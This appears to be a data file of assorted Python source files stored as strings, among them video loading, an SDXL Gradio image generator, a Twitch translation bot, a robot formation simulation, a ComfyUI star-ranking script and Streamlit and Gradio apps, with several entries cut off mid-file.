    "# -*- coding: utf-8 -*-\n# @Time    : 2024/4/6 12:02\n# @Author  : \n# @File    : video_preprocess.py\n\nimport os\nimport json\nfrom pathlib import Path\nfrom typing import Tuple, Union\n\nimport numpy as np\nimport torch\nimport random\nfrom PIL import Image, ImageSequence\nfrom decord import VideoReader\n\n\ndef load_video(video_path: Union[str, Path], num_frames: int = 16, return_tensor: bool = True,\n               sample: str = \"middle\") -> Union[np.ndarray, torch.Tensor]:\n    \"\"\"\n    Load a video from a given path, change its fps and resolution if needed\n    :param video_path (str): The video file path to be loaded.\n    :param num_frames (int): The number of frames to be loaded\n    :param return_tensor (bool): return torch tensor if True\n    :param sample: frame sample method\n    :return frames (np.ndarray):\n    \"\"\"\n    if isinstance(video_path, Path):\n        video_path = str(video_path.resolve())\n\n    if video_path.endswith('.gif'):\n        frame_ls = []\n        img = Image.open(video_path)\n        for frame in ImageSequence.Iterator(img):\n            frame = frame.convert('RGB')\n            frame = np.array(frame).astype(np.uint8)\n            frame_ls.append(frame)\n        buffer = np.array(frame_ls).astype(np.uint8)\n    elif video_path.endswith('.mp4') or video_path.endswith('.avi'):\n        import decord\n        decord.bridge.set_bridge('native')\n        video_reader = VideoReader(video_path)\n        frames = video_reader.get_batch(range(len(video_reader)))  # (T, H, W, C), torch.uint8\n        buffer = frames.asnumpy().astype(np.uint8)\n    else:\n        raise NotImplementedError(\"Video format Not implemented yet\")\n\n    frames = buffer\n    if num_frames:\n        frame_indices = get_frame_indices(\n            num_frames, len(frames), sample=sample\n        )\n        frames = frames[frame_indices]\n\n    if return_tensor:\n        frames = torch.Tensor(frames)\n        frames = frames.permute(0, 3, 1, 2)  # (T, C, H, W), torch.uint8\n\n    return frames\n\n\ndef get_frame_indices(num_frames, vlen, sample='random', fix_start=None):\n    \"\"\"\n    sample sequence frames from video\n    :param num_frames: number of frames to sample\n    :param vlen: total video length\n    :param sample: sample method, either 'rand' or 'middle'\n    :param fix_start: start frame\n    :return: frames starting from fix_start, random or middle frames\n    \"\"\"\n    assert num_frames <= vlen\n    if sample in [\"random\", \"middle\", \"start\"]:\n        if sample == \"random\":\n            intervals = range(0, vlen - num_frames + 1, num_frames)\n            start = random.choice(intervals)\n        elif sample == \"middle\":\n            start = vlen // 2 - 1\n        elif sample == \"start\":\n            start = 0\n        else:\n            raise NotImplementedError(\"no such sample method\")\n        frame_indices = [start + i for i in range(num_frames)]\n    elif fix_start is not None:\n        assert fix_start + num_frames <= vlen, \"fix start frame must be less than vlen - num_frames\"\n        frame_indices = [fix_start + i for i in range(num_frames)]\n    else:\n        raise ValueError\n    return frame_indices\n",
    "import os\r\nimport torch\r\nimport random\r\nfrom diffusers import StableDiffusionXLPipeline\r\nfrom diffusers import EulerAncestralDiscreteScheduler\r\nimport gradio as gr\r\nfrom datetime import datetime\r\nfrom PIL import PngImagePlugin\r\nimport argparse\r\nfrom compel import Compel, ReturnedEmbeddingsType\r\n\r\nparser = argparse.ArgumentParser(description='AingUI Image Generation')\r\nparser.add_argument('--port', type=int, default=7860, help='Server port (default: 7860)')\r\nparser.add_argument('--listen', action='store_true', help='Listen on all network interfaces (default: False)')\r\nparser.add_argument('--auth', nargs='?', const='username:password', help='Set username and password for Gradio app (default: username:password)')\r\nparser.add_argument('--model-path', type=str, required=True, help='Path to the model file (required)')\r\nargs = parser.parse_args()\r\n\r\nif args.auth:\r\n    username, password = args.auth.split(':')\r\nelse:\r\n    username, password = None, None\r\n\r\nmodel_path = args.model_path\r\n\r\nif os.path.isdir(model_path):\r\n    model_name = os.path.basename(model_path)  # Extract the directory name\r\n    print(f\"Loading {model_name} Diffusers model...\")\r\n\r\n    pipe = StableDiffusionXLPipeline.from_pretrained(\r\n        model_path,\r\n        torch_dtype=torch.float16,\r\n        use_safetensors=True,\r\n    )\r\n    pipe.to('cuda')\r\n\r\n    pipe.scheduler = EulerAncestralDiscreteScheduler.from_config(pipe.scheduler.config)\r\nelif model_path.endswith('.safetensors'):\r\n    model_name = os.path.basename(model_path).split('.safetensors')[0]  # Extract the filename without extension\r\n    print(f\"Loading {model_name} Safetensors model...\")\r\n\r\n    pipe = StableDiffusionXLPipeline.from_single_file(\r\n        model_path,\r\n        torch_dtype=torch.float16,\r\n        use_safetensors=True,\r\n    )\r\n    pipe.to('cuda')\r\n\r\n    pipe.scheduler = EulerAncestralDiscreteScheduler.from_config(pipe.scheduler.config)\r\nelse:\r\n    print(\"Invalid input. Please provide either a directory or a .safetensors file.\")\r\n    exit()  # Exit the script if the input is invalid\r\n\r\ndef generate_image(prompt, negative_prompt, use_seed_randomizer, custom_seed, enable_standard_quality, num_inference_steps, guidance_scale, resolution):\r\n    if use_seed_randomizer:\r\n        seed = random.randint(1, 999999999999)  # Maximum seed number is 12 digits\r\n        torch.manual_seed(seed)\r\n        random.seed(seed)\r\n        custom_seed = f\"{seed}\"\r\n    else:\r\n        if custom_seed:\r\n            seed = int(custom_seed)\r\n            torch.manual_seed(seed)\r\n            random.seed(seed)\r\n            custom_seed = f\"{seed}\"\r\n        else:\r\n            custom_seed = \"Seed not specified.\"\r\n    \r\n    # Update prompt based on checkbox state\r\n    if enable_standard_quality:\r\n        prompt += \", masterpiece, best quality, very aesthetic, absurdres,\"\r\n        negative_prompt = \"nsfw, lowres, (bad), text, error, fewer, extra, missing, worst quality, jpeg artifacts, low quality, watermark, unfinished, displeasing, oldest, early, chromatic aberration, signature, watermark, artistic error, username, scan, [abstract],\" + negative_prompt\r\n\r\n    compel = Compel(tokenizer=[pipe.tokenizer, pipe.tokenizer_2] , \r\n                text_encoder=[pipe.text_encoder, pipe.text_encoder_2], \r\n                returned_embeddings_type=ReturnedEmbeddingsType.PENULTIMATE_HIDDEN_STATES_NON_NORMALIZED, \r\n                requires_pooled=[False, True],\r\n               truncate_long_prompts=False)\r\n    \r\n    conditioning, pooled = compel([prompt, negative_prompt])\r\n\r\n    width, height = resolution.split(\" x \")\r\n    width = int(width)\r\n    height = int(height)\r\n\r\n    output = pipe(\r\n        prompt_embeds=conditioning[0:1], pooled_prompt_embeds=pooled[0:1], \r\n        negative_prompt_embeds=conditioning[1:2], negative_pooled_prompt_embeds=pooled[1:2],\r\n        width=width,\r\n        height=height,\r\n        guidance_scale=guidance_scale,\r\n        num_inference_steps=num_inference_steps\r\n    )\r\n\r\n    image = output.images[0]\r\n    image_width, image_height = image.size\r\n\r\n    # Create directory for saving images\r\n    current_date = datetime.now().strftime(\"%Y-%m-%d\")\r\n    save_dir = f\"generation/{current_date}\"\r\n    os.makedirs(save_dir, exist_ok=True)\r\n\r\n    # Create metadata dictionary\r\n    metadata = PngImagePlugin.PngInfo()\r\n    metadata_text = f\"{prompt}\\nNegative prompt: {negative_prompt}\\nSteps: {num_inference_steps}, Size: {image_width}x{image_height}, Seed: {custom_seed}, Model: {model_name}, Version: AingUI, Sampler: Euler a, CFG scale: {guidance_scale},\"\r\n    metadata.add_text(\"parameters\", metadata_text)\r\n\r\n    # Save the generated image with metadata\r\n    save_path = os.path.join(save_dir, f\"generated_image_{datetime.now().strftime('%H%M%S')}.png\")\r\n    image.save(save_path, pnginfo=metadata)\r\n\r\n    # Free GPU memory after generation\r\n    torch.cuda.empty_cache()\r\n\r\n    return save_path, custom_seed, metadata_text\r\n\r\ncss_style = \"\"\"\r\nimg {\r\n    max-height: 70vh;\r\n    width: auto;\r\n    display: block;\r\n    margin: 0 ",
    "import os\nimport json\nimport csv\nimport re\nfrom twitchio.ext import commands\nfrom twitchio.ext import routines\nimport deepl \n\nCLIENT_ID = ''\nCLIENT_SECRET = ''\nACCESS_TOKEN = ''\nREFRESH_TOKEN = ''\nAUTH_KEY = ''\nSOURCE_LANGUAGE = ''\nTARGET_LANGUAGE = ''\nCHANNEL_URL = ''\n\nclass Bot(commands.Bot):\n    def __init__(self):\n        super().__init__(token=ACCESS_TOKEN, prefix='!', initial_channels=[CHANNEL_URL])\n\n    async def event_ready(self):\n        # Bot says 'None' first, when no routine is set\n        print(f'Logged in as | {self.nick}')\n        print('Bot is ready!')\n        await self.get_channel(CHANNEL_URL).send('Translation-Bot is ready! SeriousSloth')\n    \n    async def event_message(self, message):\n        if message.echo:\n            return\n        await self.handle_commands(message)\n        if message.content[:3] == '!ja':\n            return\n        translation_result = translate(message.content, SOURCE_LANGUAGE, TARGET_LANGUAGE)        \n        if translation_result:\n            await message.channel.send(f'{message.author.name}: {translation_result}')\n        \n    async def event_command_error(self, context: commands.Context, error: Exception):\n        if isinstance(error, commands.CommandNotFound):\n            return\n        print(error)\n\n    @commands.command()\n    async def ja(self, ctx: commands.Context, *, phrase: str):\n        translation_result = translate(phrase, TARGET_LANGUAGE, SOURCE_LANGUAGE)\n        if translation_result:\n            await ctx.send(f'{ctx.author.name}: {translation_result}')\n\n    @routines.routine(seconds=900.0)\n    async def check_access_token():\n        if not is_access_token_valid():    \n            refresh_access_token()\n    check_access_token.start()\n\ndef read_credentials():\n    with open('config.csv') as f:\n        csv_reader = csv.reader(f, delimiter=',')\n        for i, row in enumerate(csv_reader):\n            if i == 1:\n                globals()['CLIENT_ID'] = row[0]\n                globals()['CLIENT_SECRET'] = row[1]\n                globals()['ACCESS_TOKEN'] = row[2]\n                globals()['REFRESH_TOKEN'] = row[3]\n                globals()['AUTH_KEY'] = row[4]\n                globals()['SOURCE_LANGUAGE'] = row[5]\n                globals()['TARGET_LANGUAGE'] = row[6]\n                globals()['CHANNEL_URL'] = row[7]\n    print('CSV-File successfully found.')\n\ndef write_credentials():\n    with open('config.csv', 'w', newline='') as f:\n        writer = csv.writer(f)\n        writer.writerow(['CLIENT_ID', 'CLIENT_SECRET', 'ACCESS_TOKEN', 'REFRESH_TOKEN', 'AUTH_KEY', 'SOURCE_LANGUAGE', 'TARGET_LANGUAGE', 'CHANNEL_URL'])\n        writer.writerow([CLIENT_ID, CLIENT_SECRET, ACCESS_TOKEN, REFRESH_TOKEN, AUTH_KEY, SOURCE_LANGUAGE, TARGET_LANGUAGE, CHANNEL_URL])\n    print('Successfully refreshed credentials.')\n\ndef is_access_token_valid():\n    validation_result = os.popen(f\"curl -X GET \\\"https://id.twitch.tv/oauth2/validate\\\" -H \\\"Authorization: OAuth {ACCESS_TOKEN}\\\"\").read()\n    parsed_validation_result = json.loads(validation_result)\n    if 'expires_in' in parsed_validation_result:\n        if parsed_validation_result['expires_in'] > 2400:\n            return True\n        else:\n            return False\n    print('Access Token Validation check failed.')\n\ndef refresh_access_token():    \n    refresh_request_result = os.popen(f\"curl -X POST \\\"https://id.twitch.tv/oauth2/token\\\" -H \\\"Content-Type: application/x-www-form-urlencoded\\\" -d \\\"grant_type=refresh_token&refresh_token={REFRESH_TOKEN}&client_id={CLIENT_ID}&client_secret={CLIENT_SECRET}\\\"\").read()\n    parsed_refresh_request_result = json.loads(refresh_request_result)\n    if 'access_token' in parsed_refresh_request_result:        \n        globals()['ACCESS_TOKEN'] = parsed_refresh_request_result['access_token']\n        globals()['REFRESH_TOKEN'] = parsed_refresh_request_result['refresh_token']\n    else:\n        print('Couldn\\'t refresh Access Token. Check Refresh Token.')\n    write_credentials()\n\ndef translate(source_text, source_l, target_l):\n    if source_l == 'JA':\n        source_text_cleaned = re.sub(r'[^\\u3000-\\u303f\\u3040-\\u309f\\u30a0-\\u30ff\\uff00-\\uff9f\\u4e00-\\u9faf\\u3400-\\u4dbf]', '', source_text)\n    elif TRANSLATOR.translate_text(source_text, target_lang='EN-US').detected_source_lang == 'EN':        \n        source_l = 'EN' # DeepL-API recognizes only EN as source-value, no EN-US or EN-GB\n        source_text_cleaned = source_text\n    else:\n        return ''\n    if source_text_cleaned:        \n        result = TRANSLATOR.translate_text(source_text, source_lang=source_l, target_lang=target_l)\n        return result.text\n\nread_credentials()\nif not is_access_token_valid():    \n    refresh_access_token()\nTRANSLATOR = deepl.Translator(AUTH_KEY)\nbot = Bot()\nbot.run()\n",
    "'''\n    Configuration functions to initialize simulations\n'''\n\nimport numpy as np\n\nfrom agent import Agent\nfrom obstacles import Obstacle\n\ndef generate_graph(n=3, random=False):\n    \n    '''\n        Generate the connectivity square matrix it must be connected:\n            n -> number of agents, by default is 3\n            random -> if the graph is random or not, by default is not and it is considered \n                      a inmediate neighbor network\n    '''\n    \n    if random:\n        pass\n    \n    else:\n        \n        L = np.zeros((n, n))\n        \n        for i in range(n):\n            for j in range(n):\n                \n                if i == j:\n                    \n                    L[i][j] = 1\n                    \n                    if i == n-1:\n                        L[i][0] = -1\n                    \n                elif j == i+1:\n                    L[i][j] = -1\n        # L = np.array([[3, -1, -1, -1, 0, 0],\n        #               [-1, 3, 0, 0, -1, -1],\n        #               [-1, 0, 2, -1, 0, 0],\n        #               [-1, 0, -1, 2, 0, 0],\n        #               [0, -1, 0, 0, 2, -1],\n        #               [0, -1, 0, 0, -1, 2]])\n    \n    return L\n\ndef desired_references(agents, leader, distance=4.0, shape=0):\n    \n    '''\n        Set the desired realtive references between agents according differente shapes rotation fixed\n            shape    -> 0 - Circle around leader\n                        1 - Triangular, leader in front\n                        2 - \n            distance -> set the distance between each agent, this must be in the constraints\n    '''\n    \n    if len(agents) >= 2:\n        \n        if shape == 0:\n            # Circular formation\n            \n            alpha = 2*np.pi / len(agents) # Angular displacement\n            r = (distance/2) / np.sin(alpha)\n            # constAngle = (np.pi - alpha) + (alpha/2)\n            # n = 1 # Number of agent\n            for agent in agents:\n                \n                aux = []\n                for i in agent.neighbors_:\n                    aux.append(agents[i-1])\n                agent.neighbors_ = aux\n                agent.disired_distance_ = distance\n                agent.generate_displacement_variables(leader)\n                \n            #     if agent.id_ == 1:\n            #         # Considere that the agent id:1 is connected with the leader\n                    \n            #         agent.l_displacement_x_ = r*np.cos(alpha)\n            #         agent.l_displacement_y_ = r*np.sin(alpha)\n                \n            #     # Displacement angle \n            #     theta = constAngle + n*alpha\n            #     if theta >= 2*np.pi:\n            #         theta -= 2*np.pi\n\n            #     # Adding the reference with respect to the neighbors\n            #     for neighbor in agent.displacement_:\n\n            #         x = distance*np.cos(theta)\n            #         y = distance*np.sin(theta)\n                    \n            #         agent.displacement_[neighbor] = [x, y]\n                    \n            #     n += 1\n                \n                # Consider around the leader\n                agent.desired_position_[0] = r*np.cos(agent.id_ * alpha)\n                agent.desired_position_[1] = r*np.sin(agent.id_ * alpha)\n                agent.distance_between_agents_ = distance\n                \n    else: # Till this moment we suppose that the one agent reachs the consensus with the leader\n        \n        agents[0].generate_displacement_variables(leader)\n        agents[0].distance_between_agents_ = 0.0\n\ndef initial_conditions(agent, center, neighbors, random, maxD=7.0, minD=4.0):\n    \n    '''\n        Generate the connectivity square matrix it must be connected:\n            agents -> List with the agents (object) to modify their initial conditions\n            random -> if the initial positions will be randomly generated\n            center -> position of the center of the sample\n            maxD   -> maximun distance from the center \n            minD   -> minimum distance from the center \n    '''\n    \n    agent.neighbors_ = neighbors\n    \n    if random:\n    \n        r = np.random.uniform(minD, maxD)\n        angle = np.random.uniform(-np.pi, np.pi)\n        \n        x = center[0] + r*np.cos(angle)\n        y = center[1] + r*np.sin(angle)\n        \n    else: \n        \n        r = np.random.uniform(minD, maxD)\n        # r = np.random.uniform(1.0, 2.0)\n        angle = np.random.uniform(-np.pi, np.pi)\n        \n        x = -center[0] + r*np.cos(angle)\n        y = -center[1] + r*np.sin(angle)\n    \n    agent.x_ = x\n    agent.y_ = y\n    \ndef generate_agents(n, L, obstacles, random=True, lPosition=[0, 0], CBFmethod=3):\n    '''\n        Generate the agents (object) and initiliza their parameters\n            n         -> number of agents\n            random    -> if the initial positions will be randomly generated\n            lPosition -> initial position of the leader\n    '''\n    \n    leader = Agent(leader=True, pos=lPosition, vel=[0.0, 0.3], acc=[0",
    "from tqdm import tqdm\nimport requests\nimport json\nimport time\nimport os\n\n# Environment variable for GitHub Token, you can get your token here: https://github.com/settings/tokens/\nGITHUB_TOKEN = os.environ.get('GITHUB_TOKEN')\n\n# URLs\nCUSTOM_NODE_LIST_URL = 'https://raw.githubusercontent.com/ltdrdata/ComfyUI-Manager/main/custom-node-list.json'\nOUTPUT_FILENAME = 'custom-node-list.json'\nCACHE_FILENAME = '.star-count-cache.json'\n\ndef fetch_custom_node_list(url):\n    response = requests.get(url)\n    if response.status_code == 200:\n        return response.json()\n    else:\n        raise Exception(f\"Failed to fetch the custom node list: HTTP {response.status_code}\")\n\ndef get_star_count(repo_url, cache):\n    # Use the cache to avoid unnecessary API calls\n    if repo_url in cache:\n        return cache[repo_url]\n\n    api_url = f\"https://api.github.com/repos/{'/'.join(repo_url.split('/')[-2:])}\"\n    headers = {'Authorization': f'token {GITHUB_TOKEN}'} if GITHUB_TOKEN else {}\n    \n    response = requests.get(api_url, headers=headers)\n    time.sleep(0.1)  # Respectful pause to avoid hitting GitHub API rate limit\n    if response.status_code == 200:\n        star_count = response.json().get('stargazers_count', 0)\n        cache[repo_url] = star_count  # Update the cache\n        return star_count\n    else:\n        print(f\"Failed to fetch star count for {repo_url}: HTTP {response.status_code}\")\n        return 0\n\ndef load_cache():\n    try:\n        with open(CACHE_FILENAME, 'r', encoding='utf-8') as file:\n            return json.load(file)\n    except FileNotFoundError:\n        return {}  # Return an empty cache if the file does not exist\n\ndef save_cache(cache):\n    with open(CACHE_FILENAME, 'w', encoding='utf-8') as file:\n        json.dump(cache, file, ensure_ascii=False, indent=4)\n\ndef print_awesome_list(data, top_n=20):\n    print(\"## Awesome List of ComfyUI Manager Custom Nodes\\n\")\n    print(\"Discover the most popular and community-endorsed custom nodes for ComfyUI Manager, \"\n          \"meticulously ranked by their GitHub Stars as on April 1, 2024.\\n\")\n    for i, node in enumerate(data['custom_nodes'][:top_n], 1):\n        print(f\"No. {i}: [{node['title']}] {node['reference']} (Star: {node['star']})\\n\")\n\ndef main():\n    # Load cache\n    cache = load_cache()\n\n    print(f\"Fetch the custom node list from {CUSTOM_NODE_LIST_URL}\")\n    data = fetch_custom_node_list(CUSTOM_NODE_LIST_URL)\n\n    # Update star counts with caching and progress bar\n    for node in tqdm(data['custom_nodes'], desc='Fetching star counts', unit='node'):\n        star_count = get_star_count(node['reference'], cache)\n        node['star'] = star_count\n        save_cache(cache)  # Save cache after each API call to preserve progress\n\n    # Sort the custom nodes by star count\n    data['custom_nodes'].sort(key=lambda x: x['star'], reverse=True)\n\n    # Write the updated and sorted data to the output file\n    with open(OUTPUT_FILENAME, 'w', encoding='utf-8') as file:\n        json.dump(data, file, ensure_ascii=False, indent=4)\n    \n    # Print the Awesome List to console\n    print_awesome_list(data)\n\n    print(f\"Ranked custom node list written to {OUTPUT_FILENAME}\")\n\nif __name__ == \"__main__\":\n    main()\n",
    "from datetime import date\n\nimport streamlit as st\nfrom st_pages import hide_pages\n\nfrom webui.constants import SPECIFIC_USER_ID_KEY_NAME\nfrom webui.server_communication import *\n\nst.set_page_config(\n    layout=\"wide\",\n)\n\nhide_pages([\"\u041f\u0440\u043e\u0441\u043c\u043e\u0442\u0440 \u0437\u0430\u044f\u0432\u043a\u0438\"])\n\nfound_trips = None\nst.title(\"\u041d\u0430\u0439\u0434\u0438 \u0441\u0435\u0431\u0435 \u0441\u043e\u0431\u0435\u0441\u0435\u0434\u043d\u0438\u043a\u0430!\")\nst.divider()\n\nchosen_transport_type = None\ntransport_type_col, date_col, code_col, time_col, from_point_col, to_point_col = st.columns(6)\nwith transport_type_col:\n    available_transport_types = get_available_transport_types()\n    chosen_transport_type = st.selectbox(\n        \"\u0422\u0440\u0430\u043d\u0441\u043f\u043e\u0440\u0442\",\n        available_transport_types,\n        index=None,\n        placeholder=\"\u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u0432\u0438\u0434 \u0442\u0440\u0430\u043d\u0441\u043f\u043e\u0440\u0442\u0430\",\n        format_func=transport_type_get_readable_view\n    )\nif chosen_transport_type is not None:\n    chosen_transport_api_name = transport_type_get_api_view(chosen_transport_type)\n    chosen_transport_uuid = get_transport_by_name(chosen_transport_api_name).id\n    available_stations = get_stations_by_type(chosen_transport_type)\n    available_stations_id_name_pairs = [StationIdNamePair(station.station_code, station.short_name) for station in available_stations]\n\n    with date_col:\n        chosen_date = st.date_input(\n            \"\u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u0434\u0430\u0442\u0443 \u043e\u0442\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u0438\u044f\",\n            value=\"today\",\n            min_value=date.today(),\n        )\n    with code_col:\n        chosen_code = st.text_input(\n            \"\u041d\u043e\u043c\u0435\u0440 \u0440\u0435\u0439\u0441\u0430\",\n            placeholder=\"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043d\u043e\u043c\u0435\u0440 \u0440\u0435\u0439\u0441\u0430, \u043d\u0430 \u043a\u043e\u0442\u043e\u0440\u043e\u043c \u0441\u043e\u0431\u0438\u0440\u0430\u0435\u0442\u0435\u0441\u044c \u0434\u043e\u0431\u0438\u0440\u0430\u0442\u044c\u0441\u044f...\",\n            value=None\n        )\n    with time_col:\n        chosen_time = st.time_input(\n            \"\u0423\u043a\u0430\u0436\u0438\u0442\u0435 \u0432\u0440\u0435\u043c\u044f \u043d\u0430\u0447\u0430\u043b\u0430 \u043f\u043e\u0435\u0437\u0434\u043a\u0438\",\n            value=None\n        )\n    with from_point_col:\n        point_from = st.selectbox(\n            \"\u041f\u0443\u043d\u043a\u0442 \u043e\u0442\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u0438\u044f\",\n            available_stations_id_name_pairs,\n            index=None,\n            placeholder=\"\u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u043f\u0443\u043d\u043a\u0442 \u043e\u0442\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u0438\u044f...\",\n            format_func=station_id_name_pair_get_readable_view\n        )\n    with to_point_col:\n        point_to = st.selectbox(\n            \"\u041f\u0443\u043d\u043a\u0442 \u043f\u0440\u0438\u0431\u044b\u0442\u0438\u044f\",\n            available_stations_id_name_pairs,\n            index=None,\n            placeholder=\"\u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u043f\u0443\u043d\u043a\u0442 \u043f\u0440\u0438\u0431\u044b\u0442\u0438\u044f...\",\n            format_func=station_id_name_pair_get_readable_view\n        )\n\n    find_transport_request = FindTripRequest()\n    find_transport_request.transportId = chosen_transport_uuid\n    if point_from is not None:\n        find_transport_request.fromId = point_from.id\n    if point_to is not None:\n        find_transport_request.toId = point_to.id\n    if chosen_date is not None:\n        find_transport_request.date = chosen_date.strftime(\"%d-%m-%Y\")\n    found_trip_response = find_trips(find_transport_request)\n    found_trips = found_trip_response.trips\n    if found_trips is not None:\n        st.divider()\n        with st.container():\n            transport_type, date, author, code, from_point, to_point = st.columns(6)\n            with transport_type:\n                st.write(\"\u0412\u0438\u0434 \u0442\u0440\u0430\u043d\u0441\u043f\u043e\u0440\u0442\u0430\")\n            with date:\n                st.write(\"\u0414\u0430\u0442\u0430 \u043e\u0442\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u0438\u044f\")\n            with author:\n                st.write(\"\u0410\u0432\u0442\u043e\u0440\")\n            with code:\n                st.write(\"\u041d\u043e\u043c\u0435\u0440 \u0440\u0435\u0439\u0441\u0430\")\n            with from_point:\n                st.write(\"\u0422\u043e\u0447\u043a\u0430 \u043e\u0442\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u0438\u044f\")\n            with to_point:\n                st.write(\"\u0422\u043e\u0447\u043a\u0430 \u043f\u0440\u0438\u0431\u044b\u0442\u0438\u044f\")\n\n            for trip in found_trips:\n                with st.container(border=True):\n                    tr_transport_type, tr_date, tr_author, tr_code, tr_from_point, tr_to_point = st.columns(6)\n                    with tr_transport_type:\n                        st.write(trip.transport.name)\n                    with tr_date:\n                        date_object = datetime.strptime(trip.date, \"%Y-%m-%dT%H:%M:%S.%f%z\")\n                        st.write(date_object.strftime(\"%Y-%m-%d\"))\n                    with tr_author:\n                        if st.button(trip.authorId.tgUsername, key=trip.id):\n                            st.session_state[SPECIFIC_USER_ID_KEY_NAME] = trip.authorId\n                            st.switch_page(\"pages/specific_trip.py\")\n                    with tr_code:\n                        if trip.code is None or len(trip.code) == 0:\n                            st.write(None)\n                        else:\n                            st.write(trip.code)\n                    with tr_from_point:\n                        st.write(trip.from_location.short_name)\n                    with tr_to_point:\n                        st.write(trip.to_location.short_name)",
    "import gradio as gr\n\nimport sys\nsys.path.append('.')\n\nfrom src.list_merger.list_utils import merge_list_folders\nfrom tools.i18n.i18n import I18nAuto\nimport os\n\ni18n = I18nAuto(language=None, locale_path=os.path.join(os.path.dirname(__file__), \"i18n/locale\"))\n\nport = 8995\nis_share = True\nif len(sys.argv) > 2:\n    port = int(sys.argv[1])\n    is_share = eval(sys.argv[2])\n\ndef get_relative_path(path, base):\n    return os.path.relpath(path, base)\n\ndef save_srt_to_file(srt_text, save_folder, character):\n    character_folder = os.path.join(save_folder, character)\n    os.makedirs(character_folder, exist_ok=True)\n    srt_file = os.path.join(character_folder, \"merged.srt\")\n    with open(srt_file, \"w\", encoding=\"utf-8\") as f:\n        f.write(srt_text)\n\ndef scan_list_folders(folder):\n    if not os.path.exists(folder):\n        os.makedirs(folder, exist_ok=True)\n    list_folders = []\n    for list_folder in os.listdir(folder):\n        if os.path.isdir(os.path.join(folder, list_folder)):\n            list_folders.append(get_relative_path(os.path.join(folder, list_folder), folder))\n    first_list_folder = \"\"\n    second_list_folder = \"\"\n    if len(list_folders) > 0:\n        first_list_folder = second_list_folder = list_folders[0]\n    if len(list_folders) > 1:\n        second_list_folder = list_folders[1]\n    return gr.Dropdown(list_folders, value=first_list_folder), gr.Dropdown(list_folders, value=second_list_folder)\n\ndef preview_merged_list(first_list_folder, second_list_folder, merge_list_character_name, save_folder):\n    if first_list_folder == \"\" or second_list_folder == \"\":\n        return \"\"\n    if first_list_folder == second_list_folder:\n        gr.Warning(i18n(\"\u4e24\u4e2a\u6587\u4ef6\u5939\u4e0d\u80fd\u76f8\u540c\uff01\uff01\uff01\"))\n        return \"\"\n    first_list_folder = os.path.join(save_folder, first_list_folder)\n    second_list_folder = os.path.join(save_folder, second_list_folder)\n    print(f\"first_list_folder: {first_list_folder}, second_list_folder: {second_list_folder}\")\n    first_list = os.path.join(first_list_folder, [file for file in os.listdir(first_list_folder) if file.lower().endswith(\".list\")][0])\n    second_list = os.path.join(second_list_folder, [file for file in os.listdir(second_list_folder) if file.lower().endswith(\".list\")][0])\n    try:\n        return merge_list_folders(first_list, second_list, merge_list_character_name, first_list_folder, second_list_folder)\n    except Exception as e:\n        gr.Warning(f\"Can't Merge, Error: {e}\")\n        return \"\"\n\n\ndef run_as_Tab(app:gr.Blocks = None):\n    \n    with gr.Row():\n        with gr.Column(scale=2):\n            scan_list_folder = gr.Textbox(\"Output/sliced_audio\", label=i18n(\"\u6587\u4ef6\u5939\u8def\u5f84\"),interactive=True)\n            scan_list_button = gr.Button(i18n(\"\u626b\u63cf\u6587\u4ef6\u5939\"), variant=\"secondary\")\n            first_list_folder = gr.Dropdown([], label=i18n(\"\u4e3b\u6587\u4ef6\u5939\"),interactive=True)\n            second_list_folder = gr.Dropdown([], label=i18n(\"\u6b21\u6587\u4ef6\u5939\"),interactive=True)\n            merge_list_character_name = gr.Textbox(\"\", label=i18n(\"\u89d2\u8272\u540d\u79f0\uff0c\u7559\u7a7a\u4f7f\u7528\u5404\u81ea\u7684\"),interactive=True)\n            merge_list_button = gr.Button(i18n(\"\u5408\u5e76\u6587\u4ef6\u5939\u4e0eList\"), variant=\"primary\")\n        with gr.Column(scale=2):\n            list_preview = gr.Textbox(\"\", lines=20, max_lines=30, label=i18n(\"\u5408\u5e76\u540e\u7684List\"))\n\n    scan_list_button.click(scan_list_folders, [scan_list_folder], [first_list_folder, second_list_folder])\n    merge_list_button.click(preview_merged_list, [first_list_folder, second_list_folder, merge_list_character_name, scan_list_folder], [list_preview])\n\n        \n\n# \u5982\u679c\u4ee5\u6a21\u5757\u5f62\u5f0f\u8fd0\u884c\nif __name__ == \"__main__\":\n    with gr.Blocks() as app:\n        with gr.Row():\n            gr.HTML(f\"\"\"<h1>{i18n(\"List\u5408\u5e76\u63d2\u4ef6\")}</h1>\n            <p>{i18n(\"\u8fd9\u662f\u4e00\u4e2a\u63d2\u4ef6\uff0c\u7528\u4e8e\u5408\u5e76List\u6587\u4ef6\u5939\u3002\")}</p><p>{i18n(\"\u4f5c\u8005: \")}<a href=\"https://github.com/X-T-E-R\">XTer</a></p>\n            \"\"\")\n        run_as_Tab(app)\n    app.launch(\n        server_name=\"0.0.0.0\",\n        inbrowser=True,\n        share=is_share,\n        server_port=port,\n        quiet=True,\n    )\n",
    "import math\nimport sys\n\nfrom PIL import Image\n\n\ndef image_prompt():\n\n    while True:\n        path = input(\"Enter the path to your image file: \").replace('\"', \"\")\n        try:\n            img = Image.open(path)\n            break\n        except FileNotFoundError:\n            print(\"Invalid image path! try again\")\n            continue\n        except AttributeError:\n            print(\"Invalid image path! try again\")\n            continue\n    return img\n\n\ndef size_prompt():\n    while True:\n        maxsize = input(\"Enter how big you want it: \")\n        try:\n            maxsize = abs(int(maxsize))\n            break\n        except ValueError:\n            print(\"Please type a whole number!\")\n            continue\n    return maxsize\n\n\ndef light_bias_prompt():\n    while True:\n        light_bias = input(\"Enter a lightness bias ( larger number for lighter images, smaller number for darker images ): \")\n        try:\n            light_bias = abs(float(light_bias))\n            break\n        except ValueError:\n            print(\"Please type a number!\")\n            continue\n    return light_bias\n\n\ndef prepare_image():\n    if len(sys.argv) < 2:\n        img = image_prompt()\n    else:\n        try:\n            img = Image.open(sys.argv[1].replace('\"', \"\"))\n        except:\n            print(\"Invalid image\")\n\n    if len(sys.argv) < 3:\n        maxsize = size_prompt()\n    else:\n        maxsize = int(sys.argv[2])\n\n    if 